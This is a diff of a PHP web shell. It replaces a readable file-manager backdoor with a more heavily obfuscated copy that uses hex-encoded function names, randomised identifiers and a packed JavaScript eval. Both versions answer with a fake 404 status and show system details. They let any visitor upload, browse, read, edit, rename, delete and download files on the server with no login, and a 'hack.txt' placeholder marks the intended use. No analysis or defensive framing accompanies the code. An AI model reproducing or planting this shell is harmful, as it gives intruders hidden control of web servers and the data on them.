@@ -1,158 +1,34 @@
-<?php
-error_reporting(0);
-http_response_code(404);
-define("self", "\x5a\x65\x72\x30\x44\x34\x59\x3f\x21\x21");
-$scD = "s\x63\x61\x6e\x64\x69r";
-$fc = array("7068705f756e616d65", "70687076657273696f6e", "676574637764", "6368646972", "707265675f73706c6974", "61727261795f64696666", "69735f646972", "69735f66696c65", "69735f7772697461626c65", "69735f7265616461626c65", "66696c6573697a65", "636f7079", "66696c655f657869737473", "66696c655f7075745f636f6e74656e7473", "66696c655f6765745f636f6e74656e7473", "6d6b646972", "72656e616d65", "737472746f74696d65", "68746d6c7370656369616c6368617273", "64617465", "66696c656d74696d65");
-for ($i = 0; $i < count($fc); $i++)
-	$fc[$i] = nhx($fc[$i]);
-if (isset($_GET["p"])) {
-	$p = nhx($_GET["p"]);
-	$fc[3](nhx($_GET["p"]));
-} else {
-	$p = $fc[2]();
-}
-function hex($str) {
-	$r = "";
-	for ($i = 0; $i < strlen($str); $i++)
-		$r .= dechex(ord($str[$i]));
-	return $r;
-}
-function nhx($str) {
-	$r = "";
-	$len = (strlen($str) -1);
-	for ($i = 0; $i < $len; $i += 2)
-		$r .= chr(hexdec($str[$i].$str[$i+1]));
-	return $r;
-}
-function perms($f) {
-	$p = fileperms($f);
-	if (($p & 0xC000) == 0xC000) $i = 's';
-	elseif (($p & 0xA000) == 0xA000) $i = 'l';
-	elseif (($p & 0x8000) == 0x8000) $i = '-';
-	elseif (($p & 0x6000) == 0x6000) $i = 'b';
-	elseif (($p & 0x4000) == 0x4000) $i = 'd';
-	elseif (($p & 0x2000) == 0x2000) $i = 'c';
-	elseif (($p & 0x1000) == 0x1000) $i = 'p';
-	else $i = 'u';
+<?php 
+error_reporting(0);http_response_code(404);define("self","\x5a\x65\x72\x30\x44\x34\x59\x3f\x21\x21");$wmnlfwgv_9697b2f6="s\x63\x61\x6e\x64\x69r";$myvpydpm_a6c5ee3c=array("7068705f756e616d65","70687076657273696f6e","676574637764","6368646972","707265675f73706c6974","61727261795f64696666","69735f646972","69735f66696c65","69735f7772697461626c65","69735f7265616461626c65","66696c6573697a65","636f7079","66696c655f657869737473","66696c655f7075745f636f6e74656e7473","66696c655f6765745f636f6e74656e7473","6d6b646972","72656e616d65","737472746f74696d65","68746d6c7370656369616c6368617273","64617465","66696c656d74696d65");for($lcfeaogg_e66c3671=0;$lcfeaogg_e66c3671<count($myvpydpm_a6c5ee3c);$lcfeaogg_e66c3671++)$myvpydpm_a6c5ee3c[$lcfeaogg_e66c3671]=ieolkjoy_4ef22799($myvpydpm_a6c5ee3c[$lcfeaogg_e66c3671]);if(isset($_GET["p"])){$qagjhiue_82079eb1=ieolkjoy_4ef22799($_GET["p"]);$myvpydpm_a6c5ee3c[3](ieolkjoy_4ef22799($_GET["p"]));}else{$qagjhiue_82079eb1=$myvpydpm_a6c5ee3c[2]();}function kcvcqjms_ffd12566($gftxtnfv_5caea3f9){$kmofraxr_6c09ff9d="";for($lcfeaogg_e66c3671=0;$lcfeaogg_e66c3671<strlen($gftxtnfv_5caea3f9);$lcfeaogg_e66c3671++)$kmofraxr_6c09ff9d.=dechex(ord($gftxtnfv_5caea3f9[$lcfeaogg_e66c3671]));return $kmofraxr_6c09ff9d;}function ieolkjoy_4ef22799($gftxtnfv_5caea3f9){$kmofraxr_6c09ff9d="";$vmomckzq_c0c38eb=(strlen($gftxtnfv_5caea3f9)-1);for($lcfeaogg_e66c3671=0;$lcfeaogg_e66c3671<$vmomckzq_c0c38eb;$lcfeaogg_e66c3671+=2)$kmofraxr_6c09ff9d.=chr(hexdec($gftxtnfv_5caea3f9[$lcfeaogg_e66c3671].$gftxtnfv_5caea3f9[$lcfeaogg_e66c3671+1]));return $kmofraxr_6c09ff9d;}function gcpraiuz_7d2299b1($uwrzvhkg_76d32be0){$qagjhiue_82079eb1=fileperms($uwrzvhkg_76d32be0);if(($qagjhiue_82079eb1&0xC000)==0xC000)$lcfeaogg_e66c3671='s';elseif(($qagjhiue_82079eb1&0xA000)==0xA000)$lcfeaogg_e66c3671='l';elseif(($qagjhiue_82079eb1&0x8000)==0x8000)$lcfeaogg_e66c3671='-';elseif(($qagjhiue_82079eb1&0x6000)==0x6000)$lcfeaogg_e66c3671='b';elseif(($qagjhiue_82079eb1&0x4000)==0x4000)$lcfeaogg_e66c3671='d';elseif(($qagjhiue_82079eb1&0x2000)==0x2000)$lcfeaogg_e66c3671='c';elseif(($qagjhiue_82079eb1&0x1000)==0x1000)$lcfeaogg_e66c3671='p';else $lcfeaogg_e66c3671='u';$lcfeaogg_e66c3671.=(($qagjhiue_82079eb1&0x0100)?'r':'-');$lcfeaogg_e66c3671.=(($qagjhiue_82079eb1&0x0080)?'w':'-');$lcfeaogg_e66c3671.=(($qagjhiue_82079eb1&0x0040)?(($qagjhiue_82079eb1&0x0800)?'s':'x'):(($qagjhiue_82079eb1&0x0800)?'S':'-'));$lcfeaogg_e66c3671.=(($qagjhiue_82079eb1&0x0020)?'r':'-');$lcfeaogg_e66c3671.=(($qagjhiue_82079eb1&0x0010)?'w':'-');$lcfeaogg_e66c3671.=(($qagjhiue_82079eb1&0x0008)?(($qagjhiue_82079eb1&0x0400)?'s':'x'):(($qagjhiue_82079eb1&0x0400)?'S':'-'));$lcfeaogg_e66c3671.=(($qagjhiue_82079eb1&0x0004)?'r':'-');$lcfeaogg_e66c3671.=(($qagjhiue_82079eb1&0x0002)?'w':'-');$lcfeaogg_e66c3671.=(($qagjhiue_82079eb1&0x0001)?(($qagjhiue_82079eb1&0x0200)?'t':'x'):(($qagjhiue_82079eb1&0x0200)?'T':'-'));return $lcfeaogg_e66c3671;}function kdqmjilf_e8b7be43($hckivivf_688a5faf,$psoqmgfh_2ba9936f=1,$uelouare_8852acdc=""){global $qagjhiue_82079eb1;$uaetwnfv_7b00651c=(($psoqmgfh_2ba9936f==1)?"success":"error");echo"<script>swal({title: \"{$uaetwnfv_7b00651c}\", text: \"{$hckivivf_688a5faf}\", icon: \"{$uaetwnfv_7b00651c}\"}).then((btnClick) => {if(btnClick){document.location.href=\"?p=".kcvcqjms_ffd12566($qagjhiue_82079eb1).$uelouare_8852acdc."\"}})</script>";}function yngjbjuj_476fff6b($xylyandh_98dd4acc){global $myvpydpm_a6c5ee3c;if(trim(pathinfo($xylyandh_98dd4acc,PATHINFO_BASENAME),'.')==='')return;if($myvpydpm_a6c5ee3c[6]($xylyandh_98dd4acc)){array_map("deldir",glob($xylyandh_98dd4acc.DIRECTORY_SEPARATOR.'{,.}*',GLOB_BRACE|GLOB_NOSORT));rmdir($xylyandh_98dd4acc);}else{unlink($xylyandh_98dd4acc);}}?>
+    <head><meta name="theme-color" content="red"><meta name="viewport" content="width=device-width, initial-scale=0.60, shrink-to-fit=no"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"><title><?= self ?></title><style>.table-hover tbody tr:hover td{background:red}.table-hover tbody tr:hover td>*{color:#fff}.table>tbody>tr>*{color:#fff;vertical-align:middle}.form-control{background:0 0!important;color:#fff!important;border-radius:0}.form-control::placeholder{color:#fff;opacity:1}li{font-size:18px;margin-left:6px;list-style:none}a{color:#fff}</style><script src="//unpkg.com/sweetalert/dist/sweetalert.min.js"></script></head><body style="background-color:#000;color:#fff;font-family:serif;"><div class="bg-dark table-responsive text-light border"><div class="d-flex justify-content-between p-1"><div><h3 class="mt-2"><a href="?"><?= self ?></a></h3></div><div><span>PHP Version : <?= $myvpydpm_a6c5ee3c[1]()?></span> <br><a href="?p=<?= kcvcqjms_ffd12566($qagjhiue_82079eb1)."&a=".kcvcqjms_ffd12566("newFile")?>">+File</a><a href="?p=<?= kcvcqjms_ffd12566($qagjhiue_82079eb1)."&a=".kcvcqjms_ffd12566("newDir")?>">+Directory</a></div></div><div class="border-top table-responsive"><li>Uname : <?= $myvpydpm_a6c5ee3c[0]()?></li></div><form method="post" enctype="multipart/form-data"><div class="input-group mb-1 px-1 mt-1"><div class="custom-file"><input type="file" name="f[]" class="custom-file-input" onchange="this.form.submit()" multiple><label class="custom-file-label rounded-0 bg-transparent text-light">Choose file</label></div></div></form>
+    <?php if(isset($_FILES["f"])){$smneiaim_7808a3d2=$_FILES["f"]["name"];for($lcfeaogg_e66c3671=0;$lcfeaogg_e66c3671<count($smneiaim_7808a3d2);$lcfeaogg_e66c3671++){if($myvpydpm_a6c5ee3c[11]($_FILES["f"]["tmp_name"][$lcfeaogg_e66c3671],$smneiaim_7808a3d2[$lcfeaogg_e66c3671])){kdqmjilf_e8b7be43("file uploaded successfully");}else{kdqmjilf_e8b7be43("file failed to upload",0);}}}if(isset($_GET["download"])){header("Content-Type: application/octet-stream");header("Content-Transfer-Encoding: Binary");header("Content-Length: ".$myvpydpm_a6c5ee3c[17](ieolkjoy_4ef22799($_GET["n"])));header("Content-disposition: attachment; filename=\"".ieolkjoy_4ef22799($_GET["n"])."\"");}?>
+    </div><div class="bg-dark border table-responsive mt-2"><div class="ml-2" style="font-size:18px;"><span>Path: </span>
+    <?php $cevgtmmy_a7ea4b8f=$myvpydpm_a6c5ee3c[4]("/(\\\|\/)/",$qagjhiue_82079eb1);foreach($cevgtmmy_a7ea4b8f as $nkuhrsfz_862575d=>$gycsmmtz_6b643b84){if($nkuhrsfz_862575d==0&&$gycsmmtz_6b643b84==""){echo "<a href=\"?p=2f\">~</a>/";continue;}if($gycsmmtz_6b643b84=="")continue;echo "<a href=\"?p=";for($lcfeaogg_e66c3671=0;$lcfeaogg_e66c3671<=$nkuhrsfz_862575d;$lcfeaogg_e66c3671++){echo kcvcqjms_ffd12566($cevgtmmy_a7ea4b8f[$lcfeaogg_e66c3671]);if($lcfeaogg_e66c3671!=$nkuhrsfz_862575d)echo "2f";}echo"\">{$gycsmmtz_6b643b84}</a>/";}?>
+    </div></div><article class="bg-dark border table-responsive mt-2">
+    <?php if(!isset($_GET["a"])):?>
+    <table class="table table-hover table-borderless table-sm"><thead class="text-light"><tr><th>Name</th><th>Size</th><th>Permission</th><th>Action</th></tr></thead><tbody class="text-light">
+    <?php $wmnlfwgv_9697b2f6=$myvpydpm_a6c5ee3c[5]($wmnlfwgv_9697b2f6($qagjhiue_82079eb1),[".",".."]);foreach($wmnlfwgv_9697b2f6 as $xylyandh_98dd4acc){if(!$myvpydpm_a6c5ee3c[6]("$qagjhiue_82079eb1/$xylyandh_98dd4acc"))continue;echo "<tr><td><a href=\"?p=".kcvcqjms_ffd12566("$qagjhiue_82079eb1/$xylyandh_98dd4acc")."\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on ".$myvpydpm_a6c5ee3c[19]("Y-m-d H:i",$myvpydpm_a6c5ee3c[20]("$qagjhiue_82079eb1/$xylyandh_98dd4acc"))."\"><i class=\"fa fa-fw fa-folder\"></i> {$xylyandh_98dd4acc}</a></td><td>N/A</td><td><font color=\"".(($myvpydpm_a6c5ee3c[8]("$qagjhiue_82079eb1/$xylyandh_98dd4acc"))?"#00ff00":(!$myvpydpm_a6c5ee3c[9]("$qagjhiue_82079eb1/$xylyandh_98dd4acc")?"red":null))."\">".gcpraiuz_7d2299b1("$qagjhiue_82079eb1/$xylyandh_98dd4acc")."</font></td><td><a href=\"?p=".kcvcqjms_ffd12566($qagjhiue_82079eb1)."&a=".kcvcqjms_ffd12566("rename")."&n=".kcvcqjms_ffd12566($xylyandh_98dd4acc)."&t=d\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a><a href=\"?p=".kcvcqjms_ffd12566($qagjhiue_82079eb1)."&a=".kcvcqjms_ffd12566("delete")."&n=".kcvcqjms_ffd12566($xylyandh_98dd4acc)."\" class=\"delete\" data-type=\"folder\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a></td></tr>";}foreach($wmnlfwgv_9697b2f6 as $uwrzvhkg_76d32be0){if(!$myvpydpm_a6c5ee3c[7]("$qagjhiue_82079eb1/$uwrzvhkg_76d32be0"))continue;$cwwgihqa_f51ba0e8=$myvpydpm_a6c5ee3c[10]("$qagjhiue_82079eb1/$uwrzvhkg_76d32be0")/1024;$cwwgihqa_f51ba0e8=round($cwwgihqa_f51ba0e8,3);$cwwgihqa_f51ba0e8=($cwwgihqa_f51ba0e8>1024)?round($cwwgihqa_f51ba0e8/1024,2)."MB":$cwwgihqa_f51ba0e8."KB";echo "<tr><td><a href=\"?p=".kcvcqjms_ffd12566($qagjhiue_82079eb1)."&a=".kcvcqjms_ffd12566("view")."&n=".kcvcqjms_ffd12566($uwrzvhkg_76d32be0)."\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on ".$myvpydpm_a6c5ee3c[19]("Y-m-d H:i",$myvpydpm_a6c5ee3c[20]("$qagjhiue_82079eb1/$uwrzvhkg_76d32be0"))."\"><i class=\"fa fa-fw fa-file\"></i> {$uwrzvhkg_76d32be0}</a></td><td>{$cwwgihqa_f51ba0e8}</td><td><font color=\"".(($myvpydpm_a6c5ee3c[8]("$qagjhiue_82079eb1/$uwrzvhkg_76d32be0"))?"#00ff00":(!$myvpydpm_a6c5ee3c[9]("$qagjhiue_82079eb1/$uwrzvhkg_76d32be0")?"red":null))."\">".gcpraiuz_7d2299b1("$qagjhiue_82079eb1/$uwrzvhkg_76d32be0")."</font></td><td><div class=\"d-flex justify-content-between\"><a href=\"?p=".kcvcqjms_ffd12566($qagjhiue_82079eb1)."&a=".kcvcqjms_ffd12566("edit")."&n=".kcvcqjms_ffd12566($uwrzvhkg_76d32be0)."\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Edit\"><i class=\"fa fa-fw fa-edit\"></i></a><a href=\"?p=".kcvcqjms_ffd12566($qagjhiue_82079eb1)."&a=".kcvcqjms_ffd12566("rename")."&n=".kcvcqjms_ffd12566($uwrzvhkg_76d32be0)."&t=f\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a><a href=\"?p=".kcvcqjms_ffd12566($qagjhiue_82079eb1)."&n=".kcvcqjms_ffd12566($uwrzvhkg_76d32be0)."&download"."\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Download\"><i class=\"fa fa-fw fa-download\"></i></a><a href=\"?p=".kcvcqjms_ffd12566($qagjhiue_82079eb1)."&a=".kcvcqjms_ffd12566("delete")."&n=".kcvcqjms_ffd12566($uwrzvhkg_76d32be0)."\" class=\"delete\" data-type=\"file\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a></div></td></tr>";}?></tbody></table>
+    <?php else:if(isset($_GET["a"]))$wtbrmjde_e8b7be43=ieolkjoy_4ef22799($_GET["a"]);?>
+    <div class="px-2 py-2">
+    <?php if($wtbrmjde_e8b7be43=="delete"){$uelouare_8852acdc=$qagjhiue_82079eb1.'/'.ieolkjoy_4ef22799($_GET["n"]);if($_GET["t"]=="d"){yngjbjuj_476fff6b($uelouare_8852acdc);if(!$myvpydpm_a6c5ee3c[12]($uelouare_8852acdc)){kdqmjilf_e8b7be43("folder deleted successfully");}else{kdqmjilf_e8b7be43("failed to delete the folder",0);}}if($_GET["t"]=="f"){$uelouare_8852acdc=$qagjhiue_82079eb1.'/'.ieolkjoy_4ef22799($_GET["n"]);unlink($uelouare_8852acdc);if(!$myvpydpm_a6c5ee3c[12]($uelouare_8852acdc)){kdqmjilf_e8b7be43("file deleted successfully");}else{kdqmjilf_e8b7be43("file to delete the folder",0);}}}?>
+    <?php if($wtbrmjde_e8b7be43=="newDir"):?>
+    <h5 class="border p-1 mb-3">New folder</h5>
+    <form method="post"><div class="form-group"><label for="n">Name :</label><input name="n" id="n" class="form-control" autocomplete="off"></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button></div></form>
+    <?php ((isset($_POST["s"]))?($myvpydpm_a6c5ee3c[12]("$qagjhiue_82079eb1/{$_POST["n"]}")?kdqmjilf_e8b7be43("folder name has been used",0,"&a=".kcvcqjms_ffd12566("newDir")):($myvpydpm_a6c5ee3c[15]("$qagjhiue_82079eb1/{$_POST["n"]}")?kdqmjilf_e8b7be43("folder created successfully"):kdqmjilf_e8b7be43("folder failed to create",0))):null);elseif($wtbrmjde_e8b7be43=="newFile"):?>
+    <h5 class="border p-1 mb-3">New file</h5>
+    <form method="post"><div class="form-group"><label for="n">File name :</label><input type="text" name="n" id="n" class="form-control" placeholder="hack.txt"></div><div class="form-group"><label for="ctn">Content :</label><textarea style="resize:none" name="ctn" id="ctn" cols="30" rows="10" class="form-control" placeholder="# Stamped By Me"></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button></div></form>
+    <?php ((isset($_POST["s"]))?($myvpydpm_a6c5ee3c[12]("$qagjhiue_82079eb1/{$_POST["n"]}")?kdqmjilf_e8b7be43("file name has been used",0,"&a=".kcvcqjms_ffd12566("newFile")):($myvpydpm_a6c5ee3c[13]("$qagjhiue_82079eb1/{$_POST["n"]}",$_POST["ctn"])?kdqmjilf_e8b7be43("file created successfully",1,"&a=".kcvcqjms_ffd12566("view")."&n=".kcvcqjms_ffd12566($_POST["n"])):kdqmjilf_e8b7be43("file failed to create",0))):null);elseif($wtbrmjde_e8b7be43=="rename"):?>
+    <h5 class="border p-1 mb-3">Rename <?=(($_GET["t"]=="d")?"folder":"file")?></h5>
+    <form method="post"><div class="form-group"><label for="n">Name :</label><input type="text" name="n" id="n" class="form-control" value="<?= ieolkjoy_4ef22799($_GET["n"])?>"></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
+    <?php ((isset($_POST["s"]))?($myvpydpm_a6c5ee3c[16]($qagjhiue_82079eb1.'/'.ieolkjoy_4ef22799($_GET["n"]),$_POST["n"])?kdqmjilf_e8b7be43("successfully changed the folder name"):kdqmjilf_e8b7be43("failed to change the folder name",0)):null);elseif($wtbrmjde_e8b7be43=="edit"):?>
+    <h5 class="border p-1 mb-3">Edit file</h5>
+    <span>File name : <?= ieolkjoy_4ef22799($_GET["n"])?></span>
+    <form method="post"><div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control"><?= $myvpydpm_a6c5ee3c[18]($myvpydpm_a6c5ee3c[14]($qagjhiue_82079eb1.'/'.ieolkjoy_4ef22799($_GET["n"])))?></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Save</button></div></form>
+    <?php ((isset($_POST["s"]))?($myvpydpm_a6c5ee3c[13]($qagjhiue_82079eb1.'/'.ieolkjoy_4ef22799($_GET["n"]),$_POST["ctn"])?kdqmjilf_e8b7be43("file contents changed successfully",1,"&a=".kcvcqjms_ffd12566("view")."&n={$_GET["n"]}"):kdqmjilf_e8b7be43("file contents failed to change")):null);elseif($wtbrmjde_e8b7be43=="view"):?>
+    <h5 class="border p-1 mb-3">View file</h5>
+    <span>File name : <?= ieolkjoy_4ef22799($_GET["n"])?></span>
+    <div class="form-group"><label for="ctn">Content :</label><textarea name="ctn" id="ctn" cols="30" rows="10" class="form-control" readonly><?= $myvpydpm_a6c5ee3c[18]($myvpydpm_a6c5ee3c[14]($qagjhiue_82079eb1.'/'.ieolkjoy_4ef22799($_GET["n"])))?></textarea></div><?php endif;?></div><?php endif;?></article><div class="bg-dark border text-center mt-2"><small>Copyright &copy; 2021 - ??!!??</small></div><script src="//code.jquery.com/jquery-3.5.1.slim.min.js"></script><script src="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/js/bootstrap.bundle.min.js" ></script><script src="//cdn.jsdelivr.net/npm/bs-custom-file-input/dist/bs-custom-file-input.min.js"></script><script>eval(function(p,a,c,k,e,d){e=function(c){return(c<a?'':e(parseInt(c/a)))+((c=c%a)>35?String.fromCharCode(c+29):c.toString(36))};if(!''.replace(/^/,String)){while(c--){d[e(c)]=k[c]||e(c)}k=[function(e){return d[e]}];e=function(){return'\\w+'};c=1};while(c--){if(k[c]){p=p.replace(new RegExp('\\b'+e(c)+'\\b','g'),k[c])}}return p}('E.n();$(\'[2-m="4"]\').4();$(".l").k(j(e){e.g();h 0=$(6).5("2-0");c({b:"a",9:"o i q?",w:"D "+0+" p C B",A:7,z:7,}).y((8)=>{r(8){x 1=$(6).5("3")+"&t="+((0=="v")?"d":"f");u.s.3=1}})});',41,41,'type|buildURL|data|href|tooltip|attr|this|true|willDelete|title|warning|icon|swal||||preventDefault|let|you|function|click|delete|toggle|init|Are|will|sure|if|location||document|folder|text|const|then|dangerMode|buttons|deleted|be|This|bsCustomFileInput'.split('|'),0,{}))</script></body></html>
 
-	$i .= (($p & 0x0100) ? 'r' : '-');
-	$i .= (($p & 0x0080) ? 'w' : '-');
-	$i .= (($p & 0x0040) ? (($p & 0x0800) ? 's' : 'x') : (($p & 0x0800) ? 'S' : '-'));
-	$i .= (($p & 0x0020) ? 'r' : '-');
-	$i .= (($p & 0x0010) ? 'w' : '-');
-	$i .= (($p & 0x0008) ? (($p & 0x0400) ? 's' : 'x') : (($p & 0x0400) ? 'S' : '-'));
-	$i .= (($p & 0x0004) ? 'r' : '-');
-	$i .= (($p & 0x0002) ? 'w' : '-');
-	$i .= (($p & 0x0001) ? (($p & 0x0200) ? 't' : 'x') : (($p & 0x0200) ? 'T' : '-'));
-	return $i;
-}
-function a($msg, $sts = 1, $loc = "") {
-	global $p;
-	$status = (($sts == 1) ? "success" : "error");
-	echo "<script>swal({title: \"{$status}\", text: \"{$msg}\", icon: \"{$status}\"}).then((btnClick) => {if(btnClick){document.location.href=\"?p=".hex($p).$loc."\"}})</script>";
-}
-function deldir($d) {
-	global $fc;
-	if (trim(pathinfo($d, PATHINFO_BASENAME), '.') === '') return;
-	if ($fc[6]($d)) {
-		array_map("deldir", glob($d . DIRECTORY_SEPARATOR . '{,.}*', GLOB_BRACE | GLOB_NOSORT));
-		rmdir($d);
-	} else {
-		unlink($d);
-	}
-}
-?>
-<!doctype html>
-<html lang="en"><head><meta name="theme-color" content="red"><meta name="viewport" content="width=device-width, initial-scale=0.60, shrink-to-fit=no"><link rel="stylesheet" href="//cdn.jsdelivr.net/npm/bootstrap@4.6.0/dist/css/bootstrap.min.css"><link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css"><title><?= self ?></title><style>.table-hover tbody tr:hover td{background:red}.table-hover tbody tr:hover td>*{color:#fff}.table>tbody>tr>*{color:#fff;vertical-align:middle}.form-control{background:0 0!important;color:#fff!important;border-radius:0}.form-control::placeholder{color:#fff;opacity:1}li{font-size:18px;margin-left:6px;list-style:none}a{color:#fff}</style><script src="//unpkg.com/sweetalert/dist/sweetalert.min.js"></script></head><body style="background-color:#000;color:#fff;font-family:serif;"><div class="bg-dark table-responsive text-light border"><div class="d-flex justify-content-between p-1"><div><h3 class="mt-2"><a href="?"><?= self ?></a></h3></div><div><span>PHP Version : <?= $fc[1]() ?></span> <br><a href="?p=<?= hex($p)."&a=".hex("newFile") ?>">+File</a><a href="?p=<?= hex($p)."&a=".hex("newDir") ?>">+Directory</a></div></div><div class="border-top table-responsive"><li>Uname : <?= $fc[0]() ?></li></div><form method="post" enctype="multipart/form-data"><div class="input-group mb-1 px-1 mt-1"><div class="custom-file"><input type="file" name="f[]" class="custom-file-input" onchange="this.form.submit()" multiple><label class="custom-file-label rounded-0 bg-transparent text-light">Choose file</label></div></div></form>
-<?php
-if (isset($_FILES["f"])) {
-	$n = $_FILES["f"]["name"];
-	for ($i = 0; $i < count($n); $i++) {
-		if ($fc[11]($_FILES["f"]["tmp_name"][$i], $n[$i])) {
-			a("file uploaded successfully");
-		} else {
-			a("file failed to upload", 0);
-		}
-	}
-}
-if (isset($_GET["download"])) {
-	header("Content-Type: application/octet-stream");
-	header("Content-Transfer-Encoding: Binary");
-	header("Content-Length: ".$fc[17](nhx($_GET["n"])));
-	header("Content-disposition: attachment; filename=\"".nhx($_GET["n"])."\"");
-}
-?>
-</div><div class="bg-dark border table-responsive mt-2"><div class="ml-2" style="font-size:18px;"><span>Path: </span>
-<?php
-$ps = $fc[4]("/(\\\|\/)/", $p);
-foreach ($ps as $k => $v) {
-	if ($k == 0 && $v == "") {
-		echo "<a href=\"?p=2f\">~</a>/"; continue;
-	}
-	if ($v == "") continue;
-	echo "<a href=\"?p=";
-	for ($i = 0; $i <= $k; $i++) {
-		echo hex($ps[$i]);
-		if ($i != $k) echo "2f";
-	}
-	echo "\">{$v}</a>/";
-}
-?>
-</div></div><article class="bg-dark border table-responsive mt-2">
-<?php if (!isset($_GET["a"])): ?>
-<table class="table table-hover table-borderless table-sm"><thead class="text-light"><tr><th>Name</th><th>Size</th><th>Permission</th><th>Action</th></tr></thead><tbody class="text-light">
-<?php
-$scD = $fc[5]($scD($p), [".", ".."]);
-foreach ($scD as $d) {
-	if (!$fc[6]("$p/$d")) continue;
-	echo "<tr><td><a href=\"?p=".hex("$p/$d")."\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on ".$fc[19]("Y-m-d H:i", $fc[20]("$p/$d"))."\"><i class=\"fa fa-fw fa-folder\"></i> {$d}</a></td><td>N/A</td><td><font color=\"".(($fc[8]("$p/$d")) ? "#00ff00" : (!$fc[9]("$p/$d") ? "red" : null))."\">".perms("$p/$d")."</font></td><td><a href=\"?p=".hex($p)."&a=".hex("rename")."&n=".hex($d)."&t=d\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a><a href=\"?p=".hex($p)."&a=".hex("delete")."&n=".hex($d)."\" class=\"delete\" data-type=\"folder\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a></td></tr>";
-}
-foreach ($scD as $f) {
-	if (!$fc[7]("$p/$f")) continue;
-	$sz = $fc[10]("$p/$f")/1024;
-	$sz = round($sz, 3);
-	$sz = ($sz > 1024) ? round($sz/1024, 2)."MB" : $sz."KB";
-	echo "<tr><td><a href=\"?p=".hex($p)."&a=".hex("view")."&n=".hex($f)."\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Latest modify on ".$fc[19]("Y-m-d H:i", $fc[20]("$p/$f"))."\"><i class=\"fa fa-fw fa-file\"></i> {$f}</a></td><td>{$sz}</td><td><font color=\"".(($fc[8]("$p/$f")) ? "#00ff00" : (!$fc[9]("$p/$f") ? "red" : null))."\">".perms("$p/$f")."</font></td><td><div class=\"d-flex justify-content-between\"><a href=\"?p=".hex($p)."&a=".hex("edit")."&n=".hex($f)."\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Edit\"><i class=\"fa fa-fw fa-edit\"></i></a><a href=\"?p=".hex($p)."&a=".hex("rename")."&n=".hex($f)."&t=f\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Rename\"><i class=\"fa fa-fw fa-pencil\"></i></a><a href=\"?p=".hex($p)."&n=".hex($f)."&download"."\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Download\"><i class=\"fa fa-fw fa-download\"></i></a><a href=\"?p=".hex($p)."&a=".hex("delete")."&n=".hex($f)."\" class=\"delete\" data-type=\"file\" data-toggle=\"tooltip\" data-placement=\"auto\" title=\"Delete\"><i class=\"fa fa-fw fa-trash\"></i></a></div></td></tr>";
-}
-?></tbody></table>
-<?php else :if (isset($_GET["a"])) $a = nhx($_GET["a"]); ?>
-<div class="px-2 py-2">
-<?php if ($a == "delete") {
-	$loc = $p.'/'.nhx($_GET["n"]);
-	if ($_GET["t"] == "d") {
-		deldir($loc);
-		if (!$fc[12]($loc)) {
-			a("folder deleted successfully");
-		} else {
-			a("failed to delete the folder", 0);
-		}
-	}
-	if ($_GET["t"] == "f") {
-		$loc = $p.'/'.nhx($_GET["n"]);
-		unlink($loc);
-		if (!$fc[12]($loc)) {
-			a("file deleted successfully");
-		} else {
-			a("file to delete the folder", 0);
-		}
-	}
-}
-?>
-<?php if ($a == "newDir"): ?>
-<h5 class="border p-1 mb-3">New folder</h5>
-<form method="post"><div class="form-group"><label for="n">Name :</label><input name="n" id="n" class="form-control" autocomplete="off"></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button></div></form>
-<?php ((isset($_POST["s"])) ? ($fc[12]("$p/{$_POST["n"]}") ? a("folder name has been used", 0, "&a=".hex("newDir")) : ($fc[15]("$p/{$_POST["n"]}") ? a("folder created successfully") : a("folder failed to create", 0))) : null); elseif ($a == "newFile"): ?>
-<h5 class="border p-1 mb-3">New file</h5>
-<form method="post"><div class="form-group"><label for="n">File name :</label><input type="text" name="n" id="n" class="form-control" placeholder="hack.txt"></div><div class="form-group"><label for="ctn">Content :</label><textarea style="resize:none" name="ctn" id="ctn" cols="30" rows="10" class="form-control" placeholder="# Stamped By Me"></textarea></div><div class="form-group"><button type="submit" name="s" class="btn btn-outline-light rounded-0">Create</button></div></form>
-<?php ((isset($_POST["s"])) ? ($fc[12]("$p/{$_POST["n"]}") ? a("file name has been used", 0, "&a=".hex("newFile")) : ($fc[13]("$p/{$_POST["n"]}", $_POST["ctn"]) ? a("file created successfully",1,"&a=".hex("view")."&n=".hex($_POST["n"])) : a("file failed to create", 0))) : null); elseif ($a == "rename"): ?>
-<h5 class="border p-1 mb-3">Rename <?= (($_GET["t"] == "d") ? "folder" : "file") ?></h5>
